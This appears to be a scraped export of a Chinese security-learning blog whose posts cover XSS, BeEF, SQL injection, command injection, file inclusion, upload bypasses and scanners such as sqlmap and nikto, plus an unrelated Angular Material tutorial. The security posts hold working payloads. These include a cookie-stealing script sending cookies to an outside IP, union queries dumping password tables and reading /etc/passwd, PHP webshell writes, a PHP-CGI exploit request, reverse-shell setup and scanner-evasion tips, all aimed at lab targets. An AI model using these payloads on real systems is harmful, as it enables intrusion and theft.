长期存储于服务器端 每次用户访问都会被执行js脚本 漏洞常见于有留言板之类功能的网站，因为评论或留言之后我们可以看到自己刚才输入的东西。这样，只要一次注入，其他人打开这个网站的时候，就会加载这个脚本，就可以盗取cookie或者记录键盘有一些评论会限制字数，不能注入完整的脚本，但是我们可以用burpsuite截断代理，截断请求，然后在请求里面注入脚本，关于怎么使用burpsuite我在之前有发过一篇工具介绍，可以参考那篇文章 对于XSS，需要对变量输入和变量输出做数据清洗（符号编码，去除一些字符），才能完全补上这个漏洞 DOM型XSSDOM ：一套js和其他语言可以调用的API1&lt;script&gt;var img=document.createElement(\"img\");img.src=\"http://1.1.1.1:88/log?\"+escape(document.cookie);&lt;/script&gt; BEEF攻击框架 生成、交付payload ruby语言编写 服务器端：管理hooked客户端 客户端：运行于客户端浏览器的 js 脚本（hook）浏览器攻击面： 应用普遍转移到B/S架构，浏览器成为统一客户端程序 结合社会工程学方法对浏览器进行攻击 攻击浏览器用户 通过注入的JS脚本，利用浏览器攻击其他网站攻击手段： 利用网站xss漏洞实现攻击，能利用存储型xss漏洞更好 诱使客户端访问含有hook的伪造站点 结合中间人攻击注入hook脚本常见用途： 键盘记录器 网络扫描 浏览器信息收集 绑定shell 与metasploit 集成使用方式：在kali2.0的左侧就有集成好的Beef，点击之后在终端可以看到提示，在浏览器中输入url就能进入到web管理页面，默认帐号和密码都是beef 在有xss漏洞的地方注入终端提示的代码，注意，要把ip地址改为beef启动的机器的ip地址 之后就能在 beef管理页面看到被hooked的网站 hooked客户端做的一切操作都会记录在log标签commands标签： 绿色：表示模块适合目标浏览器，并且执行结果不被客户端可见 红色：表示模块不适用于当前用户，有些红色模块也可以正常执行 橙色：模块可用，但结果对用户可见（CAM弹窗申请权限等） 灰色：模块未在目标浏览器上测试过 这个标签包含很多模块，可以对hooked客户端进行各种攻击，包括打开摄像头，记录表单，甚至可以利用hooked的浏览器进行DDOS攻击，就是所谓的僵尸机，有很强的隐蔽性","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"手动漏洞挖掘（二）","slug":"手动漏洞挖掘（二）","date":"2018-01-27T07:25:03.000Z","updated":"2018-02-01T07:57:30.343Z","comments":true,"path":"2018/01/27/手动漏洞挖掘（二）/","link":"","permalink":"https://recallhyx.github.io/2018/01/27/手动漏洞挖掘（二）/","excerpt":"","text":"SQL 注入 服务端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器基于报错的检测方法 123‘ 单引号，在输入框输入一个单引号，如果数据库sql语句是直接拼接的，就会识别不了指令而报错%() 基于布尔的检测–用来猜测服务器的SQL 语句结构121' and '1'='1 / 1' and '11' and '1'='2 / 1' and '0 检测数据库表有多少个字段123' order by 数字--（空格） （--就是注释的意思，在--后面加空格才能使注释生效）（例：如果user表只有4个字段，那么以下sql语句会报错：select * from user order by 5，而以下sql语句正常：select * from user order by 4） 联合查询12345678' union select 1,2-- （空格）（还是需要在--后面加空格，由上面的注入得出该输入多少个数字，有4个字段就输：1,2,3,4，这样就能得出查询的对应字段的名称）' union select user(),version()-- （空格）（还是需要在--后面加空格，user(),version()都是数据库默认的函数，得到用户和版本号，也可以根据版本号来看用的是什么数据库，比如MySql数据库版本号可能为5，但Oracle数据库版本号不可能为5,太久了，其他数据库函数：database()--数据库名称）ASCII转字符：char('字符')连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())（连接字符串，就能把多个函数合并为一个，只占一个位置，CHAR(32,58,32)就是以空格：空格的格式分隔开来） 针对MySQL数据库的一些SQL注入 information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等 简单来说，我们只要利用information_schema 就能知道数据库存放了什么表，表里的字段是什么12345678910所有库所有表/统计每库中表的数量' union select table_name,table_schema from information_schema.tables--+' union select table_schema,count(*) from information_schema.tables group by table_schema--+dvwa库中的表名' union select table_name,table_schema from information_schema.tables where table_schema='dvwa'--+查到表名users后就查表中的字段' union select table_name,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'--+之后查询user，password的内容' union select user,password from dvwa.users--+' union select null,concat(user,0x3a,password) from users--+（只是格式变了） 读取文件&#39; union select null,load_file(&#39;/etc/passwd&#39;)--+写入文件（利用 into dumpfile，这个指令还能把二进制还原，利用这个我们可以先把要传输的代码用二进制编码后传到数据库）123' union select null,\"&lt;?php passthru($_GET['cmd']); ?&gt;\" into DUMPFILE \"/tmp/a.php\"--+(tmp目录是所有用户都有权限读写执行)cat shell.php | xxd -ps | tr -d '\\n'（这句话就是把shell.php 下的内容转成十六进制，并且去掉换行符）' union select null, (0x十六进制内容) into dumpfile \"/tmp/a.php\"--+（注意：get请求有最大长度限制，所以内容太多会导致注入失败） 保存数据库&#39; union select null, concat(user,0x3a,password) from users into OUTFILE &#39;/tmp/a.db&#39;当数据库没有权限查看information_schema时，或者数据库限制不能使用 union,order by 查询猜表有没有这个列，重复的工作可以用（Burp 的intruder用字典）1' and column is null--+ （column就是要替换的列，如果没有该列，就会报错，有的话就正常） 猜当前表表名（假如由上一步得出的其中一个列名为user）and table.user is null--+ （table就是要替换的表名）猜数据库的其他表&#39; and (select count(*) from table)&gt;0--+ （table就是要替换的表名）猜字段的内容12' or user='admin' or user like '%a% 当数据库可写&#39;; update users set user=&#39;hyx&#39; where user=&#39;admin（两条语句先后执行） SQL盲注 不显示数据库内建的报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即 盲 思路：既然无法基于报错信息判断结果，就基于逻辑真假的不同结果判断12341' and 1=11' and 1=21' order by 5--+（如果sql语句有两个字段的话为假）1' order by 2--+（如果sql语句有两个字段的话为真） 如果有sql注入漏洞的话，之后的操作都合上一篇的指令差不多","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"手动漏洞挖掘（一）","slug":"手动漏洞挖掘（一）","date":"2018-01-27T07:20:44.000Z","updated":"2018-02-01T07:58:29.880Z","comments":true,"path":"2018/01/27/手动漏洞挖掘（一）/","link":"","permalink":"https://recallhyx.github.io/2018/01/27/手动漏洞挖掘（一）/","excerpt":"","text":"手动挖掘原则 所有变量 所有头cookie中的变量+逐个变量删除 默认安装漏洞 windows默认安装漏洞 phpMyAdmin/setup Ubuntu/Debian 默认安装 PHP5-cgi 可直接访问 /cgi-bin/php5 和 /cgi-bin/php123456POST http://192.168.133.132/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1Host: 192.168.20.10passthru('ls');die();?&gt; 以上这段放在Burpsuite的Repeater重放攻击，修改主机地址和目标ip地址，就能实现攻击，在php代码里面修改命令就能看到该服务器权限下能执行的命令结果 php反弹shell它在kali的位置/usr/share/webshells/php/php-reverse-shell.php修改一下，把IP换成本机的IP地址然后将所有内容复制下来复制到在burpsuite的body中 如配置文件中侦听对应的端口nc -nvvlp 1234再发送请求，就能在终端看到信息了 接下来输入的系统指令只要有权限就能执行 命令行注入漏洞如果网站有直接调用系统指令，如ping之类，可以用以下指令注入1234; 分号，代表与指令分隔 例：ping 172.16.242.128;ls 执行完ping之后就执行ls&amp;&amp; 双与，代表前面一个指令成功后，才能执行后面一个指令 例：ping 172.16.242.128&amp;&amp;ls 在ping指令成功后才会执行ls&amp; 单与，代表两条命令同时执行|| 双或，代表当前面一个命令执行失败，才执行后面一个指令 目录权限限制不严/文件包含漏洞针对运行php的服务器的远程文件包含漏洞，需要服务器的/etc/php5/cgi/php.ini中allow_url_include=On，然后重启apache服务器才有用 一句话木马&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&gt;特征但不绝对：123?page=a.php?home=b.html?file=content 经典测试方法：12345?file=../../../../etc/passwd?page=file:///etc/passwd?home=main.cgi?page=http://www.a.com/1.phphttp://1.1.1.1/../../../../dir/file.txt 绕过字符过滤12345. 点，有一些应用对图片判断是以.png结尾，来判断是不是一张图片的，这个时候只需要 a.php.png，就能绕过检查%00 空，作为截断，有一些应用的文件检查是从头开始检查的，如果遇到%00,就表示结束，不会再继续，例如a.doc%00.php ，实际上是一个php文件，但是应用的检查以为是doc文件在请求中插入过滤 如果服务器过滤链接http://这串字符，这个时候只需要在这串字符中间再插入这串字符，如在h插入，变成hhttp://ttp://这样服务器就会过滤掉中间的http://，并把过滤后的字符串拼接回去 kali攻击字典放在/usr/share/wfuzz/wordlist/vulns 文件上传漏洞12将文件名后缀修改截断代理，将content-type修改为允许的类型 怎么解决文件上传漏洞123限制上传目录的权限修改上传后文件的命名模糊上传文件目录的路径","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"安全工具介绍（三）","slug":"安全工具介绍（三）","date":"2018-01-25T07:09:40.000Z","updated":"2018-02-01T08:18:30.160Z","comments":true,"path":"2018/01/25/安全工具介绍（三）/","link":"","permalink":"https://recallhyx.github.io/2018/01/25/安全工具介绍（三）/","excerpt":"","text":"SQLMAP特点 开源sql注入漏洞监测、利用的工具 检测动态页面中get/post 参数、cookie、http头 数据榨取 文件系统访问 操作系统命令执行 引擎强大、特性丰富 XSS漏洞检测 五种漏洞监测技术 基于布尔的盲注检测 基于时间的盲注检测&#39;and (select * from (select(sleep(20)))a)--+ 基于错误的检测 基于union联合查询的检测适用于通过for循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠查询的检测;堆叠多个查询语句适用于非select的数据修改、删除的操作 SQLMAP参数介绍 TARGET:123456789101112Target: At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection -u URL, --url=URL Target URL (e.g. \"http://www.site.com/vuln.php?id=1\") -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file Get方法12345sqlmap -u \"http://172.16.242.128/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details\" -p username -f （-p的意思就是只指定一个变量，-f就是查看数据库版本）--user（就是查看数据库用户）--dbs（目标数据库有什么库）--schema（查看元数据库） Post方法1234使用http请求文件（brupsuite）：sqlmap -r request.txt（使用burpsuite截断代理并将截断的post中raw标签内的全部内容贴到request.txt文件，不能有多余的空行，要和burpsuite中看到的一样）使用brupsuite log文件：sqlmap -l log.txt（在burpsuite的option中开启log） HTTPS1sqlmap -u \"http://1.1.1.1/a.php?id=1:8843\" --force-ssl 扫描配置文件1sqlmap -c sqlmap.conf REQUEST：123456789101112131415161718192021222324252627282930313233343536373839404142434445Request: These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST --param-del=PARA.. Character used for splitting parameter values --cookie=COOKIE HTTP Cookie header value --cookie-del=COO.. Character used for splitting cookie values --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value -H HEADER, --hea.. Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\") --headers=HEADERS Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\") --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3) --randomize=RPARAM Randomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit to extract anti-CSRF token --force-ssl Force usage of SSL/HTTPS --hpp Use HTTP parameter pollution method --eval=EVALCODE Evaluate provided Python code before the request (e.g. \"import hashlib;id2=hashlib.md5(id).hexdigest()\") 数据端：–data12get/post 都适用sqlmap -u \"http://1.1.1.1/a.php\" --date=\"user=1&amp;password=1\"-f 变量分隔符： –param-del12http://1.1.1.1/a.php?q=foo;id=1sqlmap -u \"http://1.1.1.1/a.php\" --data=\"q=foo;id=1\"--param-del 设置cookie：–cookie123要先登录过网站，然后在浏览器中获得相应的cookiesqlmap -u \"http://172.16.242.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie=\"security=low; PHPSESSID=ad58bee7a7c5b3dcd7e26a24e4446e56\"检查cookie中的注入点，则要加上 --level 2（至少大于等于2） user-agent：123--random-agent：使用这个参数，就会使用/usr/share/sqlmap/txt/user-agents.txt这个字典来代替默认的user-agent检查user-agent中的注入点，则要加上--level 3（至少大于等于3） host头：12--host=\"\"检查host中的注入点，则要加上--level 5 （5为最高级别） 基于HTTP协议的身份验证1234BasicDigestNTLMsqlmap -u \"http://1.1.1.1/a.php?id=1\" --auth-type Basic --auth-cred \"user:pass\" –auth-cert / –auth-file123--auth-file=\"ca.PEM\"含有私钥的PEM 格式证书文件PEM格式的证书链文件 http(s) 代理123--proxy=\"http://127.0.0.1:8087\"（代理服务器开启后的地址）--proxy-cred=\"name:pass\" （连接代理需要的身份验证）--ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标） 其他参数123456789101112131415--delay （每次http(s)请求之间延迟时间，浮点数，单位为秒，默认无延迟）--timeout（请求超时时间，浮点数，默认30s）--retries（http(s)连接超时重试次数，默认3次）--randomize（长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名）例 sqlmap -u \"http://1.1.1.1/a.php?id=100\" --randomize='id'（这样的话，每次id就会在100-999随机取，因为长度、类型都与原始值保持一致）--scope（过滤日志内容，通过正则表达式筛选扫描对象）例 sqlmap -l burp.log --scope=\"(www)?\\.target\\.(com | net | org)\"例 sqlmap -l 2.log --scope=\"(19)?\\.169\\.20\\.(1 | 10 | 100)\"--safe-url / --safe-freq（检测和盲注阶段会产生大量失败请求，服务端可能会销毁session）（每发送--safe-freq次注入请求后，发送一次正常请求）--skip-urlencode（默认Get方法会对传输内容进行编码，某些web服务器不遵守RFC标准编码，使用原始字符提交数据）--eval（每次请求前执行指定的python代码，每次请求更改或增加新的参数值（时间依赖、其他参数值依赖））例 sqlmap -u \"http://1.1.1.1/a.php?id=1&amp;hash=111111111111111111\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\" OPTIMIZATTION:12345678Optimization: These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) -o开启下面三个性能呢参数，（除–threads参数）1234--predict-output（根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率）（检测版本名，用户名，密码，Privileges，role，数据库名称，表名，列名）与--threads参数不兼容统计表:/usr/share/sqlmap/txt/common-outputs.txt 1234--keep-alive(使用http(s)长连接，性能好)与--proxy参数不兼容长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源 1234--null-connection之火取相应页面的大小值，而非页面具体内容通常用于盲注判断 真/假 ，降低网络带宽消耗与--text-only参数不兼容 1234--threads最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束默认值为1,建议不要超过10,否则可能影响站点可用性与--predict-output参数不兼容 INJECTION123456789101112-p （指定扫描的参数，使--level失效）-skip（排除指定的扫描参数）--dbms=\"mysql\"（指定数据库管理系统版本）--os（指定操作系统 linux或window）--invalid-bignum / --invalid-logical （通常sqlmap使用负值使参数取值失效 id=13-&gt;id=-13）（bignum使用大数使参数值失效 id=9999999999）（logical使用布尔判断使取值失效 id=13 AND 18=19）--no-escape（处于混淆和避免出错的目的，payload中用单引号界定字符串时sqlmap使用char()编码逃逸的方法替换字符串）--tamper（混淆脚本，用于绕过应用层过滤，IPS，WAF）sqlmap -u \"http://1.1.1.1/a.php?id=1\" --tamper=\"between.py,randomcase.py\"具体目录（/usr/share/sqlmap/tamper） 暂时就介绍这么多，sqlmap还有很多参数，可以用命令sqlmap -hh查看","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://recallhyx.github.io/tags/工具/"}]},{"title":"安全工具介绍（二）","slug":"安全工具介绍（二）","date":"2018-01-22T12:07:15.000Z","updated":"2018-02-01T08:19:42.615Z","comments":true,"path":"2018/01/22/安全工具介绍（二）/","link":"","permalink":"https://recallhyx.github.io/2018/01/22/安全工具介绍（二）/","excerpt":"","text":"skipfishC语言编写，实验性的主动web安全评估工具，递归爬取，基于字典探测，速度较快，多路单线程，全异步网络I/O，消除内存管理和调度开销，启发式自动内容识别，误报较低用法12skipfish -o 目录 http://172.16.242.128/ ×将扫描结果存在目录skipfish -o 目录 @新建文件.txt ×扫描一个文件里面的url 1234567参数或技巧：-I （大写 i）：只检查包含‘string’的url 例：skipfish -o test1 -I /dvwa/ http://172.16.242.128/dvwa/dkpg -L skipfish | grep wl ：查看skipfish自带的字典-S ：使用字典扫描 例：skipfish -o test2 -I /dvwa/ -S /usr/share/skipfish/dictionaries/complete.wl http://172.16.252.128/dvwa/-X ：不检查包含‘string’的url 例： skipfish -o test3 -X /logout.php/ http://172.16.242.128/dvwa/-l （小写L） 每秒最大请求数 例： skipfish -o test4 -l 20 http://172.16.242.128/dvwa/-m 每ip最大并发链接数 身份认证1skipfish -o test5 -C \"sessionid=123\" -C \"secruity=low\" -I /dvwa/ http://172.16.242.128/dvwa OWASP_ZAPzed atteck proxy，web application 集成渗透测试和漏洞挖掘工具，开源免费跨平台简单易用，截断代理，主动，被动扫描，Fuzzy 暴力破解截断代理：就像vega一样，要手动去点击页面，浏览器也需要设置代理，默认代理端口为8080主动扫描：在quick start输入url，点击Attack就开始了 Fuzzy：在工具栏的tools，就可以看到fuzz选项，点击后选择一个模式的某个url进入以下窗口 zap就会自动生成请求头，然后选择某些字，点击右边的add 再选择要替换的内容，点击确定，然后start fuzz 就能在下面的标签栏看到刚才的请求 也可以使用file fuzzers 来选择，就像上面的图片一样，选择目录发现的字典来进行 fuzz扫描策略： 如图，在右上角有一个scan policy manager的图标，点击就会出现一个新窗口，可以修改默认测略，也可以新建一个测略 注意：攻击强度太高，可能会把目标服务器搞垮，尽量不要使用，在最下两个选项选择后，需要点击Go按钮确认。扫描标准流程：1、设置代理2、手动爬网3、自动爬网4、主动扫描 Burpsuite统一的集成工具发现现代web安全漏洞，所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息，Brup free 没有主动扫描工具，profession 有主动扫描工具生成证书： 在Proxy选项卡中的Options选项卡中的Proxy Listeners可以选择导出证书，选择第一个导出之后，就可以在浏览器添加证书爬网：在pro版本上，菜单栏的Brup可以点击save state然后可以与之后的扫描做对比 intruder：用来fuzz模糊测试的功能 点击send to Intruder就能在Intruder标签看到以下内容 这是定义变量，在左边可以添加、清除变量，这个变量就是要替换的内容在payload标签选择字典12345Attack Type：Sniper：一次只指定一个字典进行攻击，也就是说，设置了两个变量，在攻击的时候一个变量会先用字典的内容替换，另外一个变量会固定Battering ram：一次只指定一个字典攻击，但是两个变量都是同时替换，替换成同个字典Pitch fork ：有多少个变量，就指定多少个字典，在攻击的时候，是每个字典的同一行进行替换，如果两个字典的行数不匹配，则在执行完短的字典后就停止攻击Cluster bomb：攻击时，先选择一个字典的第一行，然后再选择另一个字典的全部行进行攻击 在option选项卡中的Grep Match可以指定字符，当该字符出现的时候，就代表攻击成功，会在攻击的窗口出现打勾 除了把表单内容设置为变量，还可以把url的某个字作为变量。","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://recallhyx.github.io/tags/工具/"}]},{"title":"安全工具介绍（一）","slug":"安全工具介绍（一）","date":"2018-01-19T15:34:31.000Z","updated":"2018-02-01T08:20:40.391Z","comments":true,"path":"2018/01/19/安全工具介绍（一）/","link":"","permalink":"https://recallhyx.github.io/2018/01/19/安全工具介绍（一）/","excerpt":"","text":"HTTrack主要是用来爬取网站对应的文件，包括html和js等其他资源文件，当爬取下来本地之后，就能再本地看这个网站用的所有文件中，有没有一些文件是配置文件可以攻击 Nikto最大的特点就是能够解决404误判，在当时有一些无效的页面也会返回200，这个时候如果只根据返回码200来攻击，那就会浪费资源。 就会在发起请求之前，先发起几千次各种无效后缀的文件请求，获得对应的相应内容，然后才会发送真正的请求，主要用于扫描服务端的漏洞12345678常用指令nikto update *更新nikto ，要翻墙nikto -list-plugins *列出所有的插件nikto -host http://172.16.242.128/dvwa *扫描方式一，域名nikto -host 172.16.242.128 -port 80,443 *扫描方式二，ip地址加端口，http默认443，在后面加参数 -sslnikto -host host.txt *扫描方式三，扫描一串ip地址的文件nikto -host https://www.baidu.com -useproxy http://localhost:8087 *扫描方式四，代理扫描nikto -host https://172.16.242.128/dvwa -evasion 12345678 *扫描方式五，逃避扫描，即用一些技术逃避服务端的一些监测， 后面的数字12345678 代表使用的技术的编号，具体可以用 man nikto 查看 打开配置文件命令vi /etc/nikto.conf 用 nikto 记得改默认配置，把useragent改成其他浏览器的useragent，免得被人查看日志就发现有人用nikto扫描。要使用cookie，就要找到配置文件里面的 static-cookie 自己设置 vega图形化界面，java编写的，代理模式，扫描模式，爬站，处理表单，注入测试，支持ssl，注意，Kali linux 2.0 没有内置 vega apt-get install vega 手动下载一定要配置代理，如下，ip:127.0.0.1,port:8888 然后在浏览器里面设置代理，我用的是火狐的 AutoProxy 这样浏览器的流量就会通过代理，但是需要手动点击页面，提交表单或者其他 手动点完页面之后就会产生以上，看左侧的Website View，灰色的意思就是页面会链接到其他页面，但是我们没有手动点到，然后，就把模式，从proxy转到scanner模式，让vega自己去爬取网站。下面的Scan Alerts就是手动点击页面之后的一些漏洞报告，点击可查看详情 然后点击左上角第三个图标手动添加一个scope 最下面的Exclude就是排除扫描的url，因为有一些链接会注销当前用户，这样页面就不能一直爬下去了。然后点击左上角第一个图标开始vega扫描，选择刚创建的scope，就可以开始扫描。如果网站需要cookie，除了可以在刚才的开始扫描图标的向导里面设置，还可以在主界面右下角identities的右边小黑人创建一个identities，基于表单的登录就要选择macro模式 然后选择登录的链接，就可以添加 然后再点击刚添加的链接，才能生成链接的参数 接下来就能在左上角第一个图标继续进行扫描了。 截断能够截断发送给服务器的请求，也能截断服务器的响应。在第二个标签，右上角添加截断规则，就能对请求截断 不过这个工具的截断不如 Burpsuite，以后会讲到Burpsuite这个工具的","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://recallhyx.github.io/tags/工具/"}]},{"title":"Angular Material2 常用组件用法","slug":"AngularMaterial2常用组件用法","date":"2018-01-13T02:42:31.000Z","updated":"2018-01-27T07:03:01.168Z","comments":true,"path":"2018/01/13/AngularMaterial2常用组件用法/","link":"","permalink":"https://recallhyx.github.io/2018/01/13/AngularMaterial2常用组件用法/","excerpt":"","text":"（时隔2个多月终于有时间来写博文了）先总结一下，11月接到一个项目，做到12月然后停工准备考试，到1月才重新开始工作，把一些收尾工作做了，这个项目也是第一次用 Angular Material2 组件，其中还是有一些坑的，就记录一下这是Angular Material官网 一、安装Angular Material首先根据官网的指导Get Start安装Material坑1： 安装完的 Angular Material，有时候不能 AOT预编译，这个时候要看依赖包文件，我是用 webpack 这个框架，所以看package.json就可以看到所有依赖包 依赖包 可以看到，除了&quot;@angular/material&quot;: &quot;^5.0.0-rc0&quot;为5.0.0之外，还有其他包也要升级，至少要升级到5.0.0坑2：即使你已经升级到最新版，还有可能不能AOT编译，当初这个问题搞了我好久，（也不久，就一个晚上），然后就有种直觉是框架的问题，第二天果断换框架，其实也就是升级框架，之前用的是 webpack6，看了github发现 webpack 已经有7了，果断换成webpack7，然后就能 AOT预编译了总结：一开始遇到问题是很正常的，这还是第一步，所以第一步不好好解决的话，后面的工作会很难开展的，幸好是项目一开始就发现不能AOT预编译的问题，不然到后期大改就很麻烦了 二、使用Angular Material关于怎么使用 Angular Material 官网并没有说明怎么用，一开始我以为引入组件就能用的，其实并不是，看了官网的例子也没有说，之后通过官网在线编辑，才发现玄机123456789101112131415161718192021222324252627282930313233import &#123; MatAutocompleteModule, MatButtonModule, MatButtonToggleModule, MatCardModule, MatCheckboxModule, MatChipsModule, MatDatepickerModule, MatDialogModule, MatExpansionModule, MatGridListModule, MatIconModule, MatInputModule, MatListModule, MatMenuModule, MatNativeDateModule, MatPaginatorModule, MatProgressBarModule, MatProgressSpinnerModule, MatRadioModule, MatRippleModule, MatSelectModule, MatSidenavModule, MatSliderModule, MatSlideToggleModule, MatSnackBarModule, MatSortModule, MatTableModule, MatTabsModule, MatToolbarModule, MatTooltipModule, MatStepperModule,&#125; from '@angular/material'; 123456789101112131415161718192021222324252627282930313233343536373839import &#123;CdkTableModule&#125; from '@angular/cdk/table';@NgModule(&#123; exports: [ CdkTableModule, MatAutocompleteModule, MatButtonModule, MatButtonToggleModule, MatCardModule, MatCheckboxModule, MatChipsModule, MatStepperModule, MatDatepickerModule, MatDialogModule, MatExpansionModule, MatGridListModule, MatIconModule, MatInputModule, MatListModule, MatMenuModule, MatNativeDateModule, MatPaginatorModule, MatProgressBarModule, MatProgressSpinnerModule, MatRadioModule, MatRippleModule, MatSelectModule, MatSidenavModule, MatSliderModule, MatSlideToggleModule, MatSnackBarModule, MatSortModule, MatTableModule, MatTabsModule, MatToolbarModule, MatTooltipModule, ]&#125;)export class DemoMaterialModule &#123;&#125; 在官网的在线编辑的main.ts（或者app.module.ts）里面，是有以上两段代码的，这就是把所有的material组件作为一个module，然后再把这个module放到整个项目内唯一一个AppModule里面，就像官网做的那样 这样就能成功引用组件了 三、常用组件用法1、buttonbutton是最基础的组件，最常用的就是提交表单的时候，这里用一个验证码的例子来说明button怎么用 这里点击获取验证码后就disable使按钮不可点击，然后再根据后端返回值，来进行倒数 倒计时代码如下：1234567891011121314151617//倒计时countdown = 30;setTime(obj)&#123; if(this.countdown==0)&#123; this.disablebtn = false; this.tipstring = \"获取验证码\"; this.countdown = 30; return; &#125;else&#123; this.disablebtn = true; this.tipstring = \"（\"+this.countdown+\"s）\"; this.countdown--; &#125; setTimeout(()=&gt;&#123; this.setTime(obj); &#125;,1000)&#125; 这样，要一个变量控制是否disable按钮，然后根据业务逻辑自己调整即可2、tabs tabs 这里主要讲 tabs的事件怎么用12345&lt;!-- html --&gt;&lt;mat-tab-group (selectedTabChange)=\"select($event)\"&gt; &lt;mat-tab label=\"Tab 1\"&gt;Content 1&lt;/mat-tab&gt; &lt;mat-tab label=\"Tab 2\"&gt;Content 2&lt;/mat-tab&gt;&lt;/mat-tab-group&gt; 123456789101112//tsselect = (tabChangeEvent: MatTabChangeEvent): void =&gt; &#123; console.log(tabChangeEvent.index); switch (tabChangeEvent.index) &#123; case 0: &#123; ... &#125; break; case 1: &#123; ... &#125; break; &#125; &#125;; 上面的 tabChangeEvent.index就是你现在选中的tab，根据不同的tab可以做不同的事情3、snackbar snackbar snackbar 就相当于 Android 的 toast，为了提醒用户一些信息的snackbar 不难，重点在于它可以复用 ，它有一个属性data可以用来传值 传值 之后只需要在snackbar组件中就可以用 data属性了4、dialog对话框是一个很重要的交互方式，它可以用于提醒用户信息，也可以用来进行一些输入，这里给出一个复用的例子，用于通知用户一些信息123456789&lt;!-- html --&gt;&lt;h1 mat-dialog-title&gt;&#123;&#123;data.title&#125;&#125;&lt;/h1&gt;&lt;div mat-dialog-content&gt; &lt;p&gt;&#123;&#123;data.content&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;div mat-dialog-actions align=\"center\"&gt; &lt;button *ngIf=\"data.isOkButton\" mat-button (click)=\"data.OkEvent()\" tabindex=\"2\"&gt;&#123;&#123;data.OkButtonContent&#125;&#125;&lt;/button&gt; &lt;button *ngIf=\"data.isNoButton\" mat-button (click)=\"data.NoEvent()\" tabindex=\"1\"&gt;&#123;&#123;data.NoButtonContent&#125;&#125;&lt;/button&gt;&lt;/div&gt; 1234567891011121314151617export class CustomDialogNoticeComponent&#123; constructor( public dialogRef: MatDialogRef&lt;CustomDialogNoticeComponent&gt;, @Inject(MAT_DIALOG_DATA) public data: any) &#123; &#125;&#125;export 